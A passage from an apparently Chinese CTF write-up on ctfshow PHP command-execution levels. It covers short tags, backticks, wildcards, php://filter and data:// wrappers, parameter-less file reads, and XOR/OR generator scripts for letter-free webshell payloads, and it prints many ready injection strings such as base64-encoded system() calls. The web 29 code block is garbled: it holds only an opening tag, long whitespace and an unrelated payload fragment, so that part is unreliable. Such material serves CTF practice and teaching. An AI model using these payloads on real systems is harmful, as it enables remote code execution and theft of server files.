中还有两种短标签，即<code>&lt;? ?&gt;</code>和<code>&lt;?= ?&gt;</code>。</p><p>当关键字 “php” 被过滤了之后，此时我们便不能使用<code>&lt;?php ?&gt;</code>了，但是我们可以用另外两种短标签进行绕过，并且在短标签中的代码不需要使用分号<code>;</code>。</p><ul><li><code>&lt;? ?&gt;</code>相当于对<code>&lt;?php ?&gt;</code>的替换。</li><li>而<code>&lt;?= ?&gt;</code>相当于<code>&lt;?php echo ... ?&gt;</code></li></ul><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="string">&#x27;Hello World&#x27;</span><span class="meta">?&gt;</span>    <span class="comment">// 输出 &quot;Hello World&quot;</span></span><br></pre></td></tr></table></figure><h3 id="反引号"><a class="markdownIt-Anchor" href="#反引号"></a> 反引号</h3><p>PHP中，反引号可以直接命令执行系统命令，但是如果想要输出执行结果还需要使用 echo 等函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> `ls /`;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>同样，也可以使用短标签</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span> `ls /`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="通配符绕过"><a class="markdownIt-Anchor" href="#通配符绕过"></a> 通配符绕过</h3><p>通配符（例如 <code>*</code> 或 <code>?</code>）是一种在命令行或编程中用来匹配多个文件或字符串的方式</p><p>可以利用通配符进行安全绕过或攻击，实现未授权访问或执行恶意操作，通常出现在文件名匹配、路径解析、正则表达式、网络过滤等场景中。<strong>当字母数字或者一些特殊的字符被过滤掉时，不能直接传入，就可以考虑用通配符进行绕过</strong></p><ul><li><p>常见的通配符：</p><ul><li><p><code>*</code>：匹配任意数量的字符。</p></li><li><p><code>?</code>：匹配一个字符。</p><blockquote><p>例如，<code>a?c</code> 可以匹配 <code>abc</code> 或 <code>a1c</code>，但不会匹配 <code>ac</code>。</p></blockquote></li><li><p><code>[ ]</code>：匹配指定范围内的字符。</p><p>[abcd] 匹配abcd中任何一个字符</p><p>[a-z] 表示范围a到z中任意一个字符</p></li></ul></li><li><p>例子：</p><p>绕过对 <code>flag</code> 的过滤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?c=system(&#x27;cat fl*.php&#x27;);  </span><br><span class="line">?c=system(&#x27;cat f?ag.php&#x27;);</span><br><span class="line">?c=passthru(&#x27;tac f*&#x27;);</span><br><span class="line">?c=eval($_GET[cmd]);&amp;cmd=system(&quot;tac f*&quot;);</span><br></pre></td></tr></table></figure></li><li><p><strong>注意通配符仅仅可以使用在系统命令上面（即系统命令行shell上的命令）</strong></p></li></ul><h3 id="伪协议包含"><a class="markdownIt-Anchor" href="#伪协议包含"></a> 伪协议包含</h3><p>伪协议并不涉及实际的网络通信，而是PHP提供的一种机制，用于在处理文件或数据流时使用特殊的方式来操作文件。伪协议允许开发者对文件内容进行额外的处理，如编码、过滤等。</p><ul><li><p>php伪协议绕过：</p><ul><li><p><a href="https://blog.csdn.net/Scalzdp/article/details/134337050">Web安全之PHP的伪协议漏洞利用，以及伪协议漏洞防护方法</a></p></li><li><p><a href="https://www.cnblogs.com/linfangnan/p/13535097.html">CTF-WEB：PHP 伪协议</a></p></li></ul></li><li><p><strong>伪协议类型</strong></p><ul><li><p><code>php://filter</code>：作用是对文件流进行过滤，它可以让你在读取文件的同时对内容进行处理，例如base64编码，从而绕过文件读取限制。常见的用途是用 <code>php://filter</code> 来<strong>读取服务器上的敏感文件</strong>（如 <code>flag</code> 文件、配置文件等），而无需直接访问文件。</p></li><li><p><code>data://</code> ：可以将数据直接嵌入到文件流中，这意味着你可以将任意的数据（包括PHP代码）嵌入，并让PHP将它当作代码执行。攻击者可以通过 <code>data://</code> 来<strong>注入和执行恶意代码</strong>。</p><p>data伪协议可以使用base64加密执行的代码：</p><p>这种格式告诉 PHP，接下来的数据是经过 Base64 编码的，因此 PHP 在处理数据之前会先进行 Base64 解码，之后再执行数据内容。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:<span class="comment">//text/plain;base64,&lt;base64-encoded-data&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>示例</strong></p><p>可以使用include函数结合伪协议 <code>php://filter</code> 来绕过关键字过滤并读取敏感文件，将想要读取的文件通过伪协议读取并以base64编码的形式显示。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">括号被过滤的情况下</span></span><br><span class="line">?c=include&quot;$_GET[a]&quot;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果双引号也被过滤</span></span><br><span class="line">?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">通过data伪协议直接执行代码</span></span><br><span class="line">?c=data://text/plain,&lt;?php system(&#x27;tac f*&#x27;);?&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果想要执行的代码被过滤，可以采用<span class="built_in">base64</span>加密</span></span><br><span class="line">?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZionKTs/Pg==</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h3 id="无参数文件读取"><a class="markdownIt-Anchor" href="#无参数文件读取"></a> 无参数文件读取</h3><ol><li><p><strong>概念</strong></p><p>无参数文件读取指的是在代码执行过程中，不直接传递参数（如字符串、数字等显式的值）的方式，而是通过代码中的其他方式来读取文件内容。在CTF题目中，攻击者往往会遇到参数过滤或限制，不能直接传递文件名或路径作为函数的参数。这时，攻击者需要通过隐式地构造参数，绕过这些限制，完成文件读取。</p><ul><li><p>通常情况下，我们都是使用 <code>&quot;&quot;</code> 来直接读取文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br></pre></td></tr></table></figure><p>在无参数的情况下，这种读取方法是不可取的</p></li><li><p>为了绕过直接传递文件名的限制，我们需要<strong>利用 PHP 的其他函数来构造出文件名</strong>。</p></li></ul></li><li><p><strong>应用场景</strong>：通常出现在文件包含漏洞的场景中。</p><ul><li>题目中可能会对传递的参数进行过滤，如禁用 <code>'</code>、<code>&quot;</code>、<code>/</code> 等字符。如果我们直接使用带有这些字符的文件路径，程序会拒绝执行。</li></ul></li><li><p><strong>一些无参数文件读取函数</strong></p><ul><li><p><strong>scandir()</strong> ：返回当前目录中的所有文件和目录的列表。返回的结果是一个数组，其中包含当前目录下的所有文件和目录名称。</p><p>例如返回的输出可能如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Array ( </span><br><span class="line">    [0] =&gt; . </span><br><span class="line">    [1] =&gt; .. </span><br><span class="line">    [2] =&gt; flag.php </span><br><span class="line">    [3] =&gt; index.php </span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>表明在当前目录下有两个文件 <code>flag.php</code> 和 <code>index.php</code>，以及两个特殊的目录项 <code>.</code> 和 <code>..</code>分别代表当前目录和父目录</p></li><li><p><strong>localeconv()</strong> ：返回一哥包含本地数字及货币格式信息的数组。（这个数组的第一项就是 <code>.</code>，这个 <code>.</code> 的用处很大）</p></li><li><p><strong>current() 和 post()</strong>：返回数组中的单元，默认取第一个值。</p></li><li><p><strong>数组移动操作</strong></p><ul><li>end() ： 将内部指针指向数组中的最后一个元素，并输出</li><li>next() ：将内部指针指向数组中的下一个元素，并输出</li><li>prev() ：将内部指针指向数组中的上一个元素，并输出</li><li>reset() ： 将内部指针指向数组中的第一个元素，并输出</li><li>each() ： 返回当前元素的键名和键值，并将内部指针向前移动</li><li>pos()：返回数组中当前元素的值</li><li>array_reverse()：将数组逆序排列</li></ul></li></ul></li></ol><h3 id="无字母数字绕过"><a class="markdownIt-Anchor" href="#无字母数字绕过"></a> 无字母数字绕过</h3><p>参考：</p><ul><li><p><a href="https://www.freebuf.com/articles/network/279563.html">老生常谈的无字母数字 Webshell 总结</a></p></li><li><p><a href="https://blog.csdn.net/miuzzx/article/details/109143413">无字母数字绕过正则表达式总结</a></p></li></ul><ol><li><p><strong>概念</strong></p><p>服务器限制了我们传入 shell 参数中的值不能存在字母和数字，但是并没有限制除了字母和数字以外的其他字符。所以我们可以<strong>将非字母数字的字符经过各种转换、运算，最后能构造出<code>a-z0-9</code>中的任意一个字符</strong>。然后再利用 PHP 允许动态函数执行的特点，拼接处一个函数名，比如 “assert”、“system”、“file_put_contents”、“call_user_func” 等危险函数然后动态执行实现绕过。</p></li><li><p><strong>应用场景</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(!preg_match(&#x27;/[a-z0-9]/is&#x27;,$_GET[&#x27;shell&#x27;])) &#123;</span><br><span class="line">eval($_GET[&#x27;shell&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>异或运算绕过</strong></p><p>在 PHP 中两个字符串异或之后，得到的还是一个字符串。如果正则匹配过滤了字母和数字，那就可以使用两个不在正则匹配范围内的非字母非数字的字符进行异或，从而得到我们想要的字符串。例如：<code>?</code> 和 <code>~</code> 进行异或得到的是字母 <code>A</code> 。基于这个原理我们可以构造无字母数字的webshell</p><p><strong>异或绕过脚本</strong></p><ul><li><p>生成 <code>xor_rce.txt</code> 文档，其中包含了所有可见字符的异或构造结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>接着运行以下 Python 脚本，输入你想要构造的函数名和要执行的命令即可生成最终的 Payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># author yu22x</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line"><span class="keyword">from</span> sys import *</span><br><span class="line">import os</span><br><span class="line">def <span class="title function_ invoke__">action</span>(arg):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i in arg:</span><br><span class="line">       f=<span class="title function_ invoke__">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> True:</span><br><span class="line">           t=f.<span class="title function_ invoke__">readline</span>()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.<span class="title function_ invoke__">close</span>()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">   param=<span class="title function_ invoke__">action</span>(<span class="title function_ invoke__">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+<span class="title function_ invoke__">action</span>(<span class="title function_ invoke__">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="keyword">print</span>(param)</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>例如：构造 <code>system('ls')</code> 命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] your <span class="function"><span class="keyword">function</span>：<span class="title">system</span></span></span><br><span class="line"><span class="function">[+] <span class="title">your</span> <span class="title">command</span>：<span class="title">ls</span></span></span><br><span class="line"><span class="function">(<span class="params"><span class="string">&quot;%08%02%08%08%05%0d&quot;</span>^<span class="string">&quot;%7b%7b%7b%7c%60%60&quot;</span></span>)(<span class="params"><span class="string">&quot;%0c%08&quot;</span>^<span class="string">&quot;%60%7b&quot;</span></span>)</span>;</span><br></pre></td></tr></table></figure></blockquote></li></ul></li><li><p><strong>或运算绕过</strong></p><ul><li><p>生成或运算结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* author yu22x */</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;or_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[0-9a-z]/i&#x27;</span>;<span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>构造命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># author yu22x</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line"><span class="keyword">from</span> sys import *</span><br><span class="line">import os</span><br><span class="line">def <span class="title function_ invoke__">action</span>(arg):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i in arg:</span><br><span class="line">       f=<span class="title function_ invoke__">open</span>(<span class="string">&quot;or_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> True:</span><br><span class="line">           t=f.<span class="title function_ invoke__">readline</span>()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.<span class="title function_ invoke__">close</span>()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">   param=<span class="title function_ invoke__">action</span>(<span class="title function_ invoke__">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+<span class="title function_ invoke__">action</span>(<span class="title function_ invoke__">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="keyword">print</span>(param)</span><br></pre></td></tr></table></figure></li></ul></li></ol><h2 id="web-29-"><a class="markdownIt-Anchor" href="#web-29-"></a> web 29-</h2><p>这部分的wp主要参考：</p><ul><li><a href="https://blog.csdn.net/yzl_007/article/details/120688613">ctfshow web入门 29-124 命令执行</a></li><li><a href="https://blog.csdn.net/Aluxian_/article/details/131024590">CTFShow-WEB入门篇命令执行详细Wp(29-40)</a></li><li><a href="https://blog.csdn.net/qq_49480008/article/details/113177878">CTFshow web入门——命令执行</a></li></ul><h3 id="web-29"><a class="markdownIt-Anchor" href="#web-29"></a> web 29</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             <span class="meta">?&gt;</span>&amp;cmd=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>关闭符的使用</strong>：</p><p>正常情况下，我们应该使用下面的语句 ：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">include</span><span class="string">&quot;<span class="subst">$_GET</span>[a]&quot;</span>;&amp;a=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><p>但是<strong>因为源代码对分号进行了过滤，所以考虑使用php的 <code>?&gt;</code> 关闭符</strong></p><p><code>?&gt;</code> 是 PHP 代码块的结束符，遇到它时，PHP 代码块被关闭，PHP 解析器会结束 PHP 代码执行，切换到 HTML 模式。因此，当你使用 <code>?&gt;</code> 时，PHP 会自动结束当前的代码块，不需要显式地使用分号 <code>;</code>。即：当使用 <code>?&gt;</code> 来结束 PHP 代码块时，<strong><code>?&gt;</code> 前的那句代码会被执行</strong>，即使没有使用分号 <code>;</code> 来明确结束这条语句，PHP 会自动认为该语句结束，切换到 HTML 或纯文本模式继续解析。</p><p>我们再看源代码，<code>eval($c);</code> 将参数c作为代码执行后，php代码闭合，后续的语句作为HTML或纯文本也不影响源代码业务逻辑。</p></blockquote><p>使用伪协议将flag文件内容以base64加密的形式读取出来，得到以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 